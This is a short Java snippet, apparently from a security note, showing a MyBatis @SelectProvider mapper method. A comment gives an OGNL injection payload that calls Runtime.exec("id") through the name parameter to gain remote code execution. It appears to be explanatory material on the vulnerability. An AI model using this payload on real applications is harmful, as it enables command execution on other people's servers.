@SelectProvider(type = UserSqlProvider.class, method = "findUser")
List<User> findUser(String name);
// name = ${@java.lang.Runtime@getRuntime().exec("id")} → OGNL evaluation → RCE
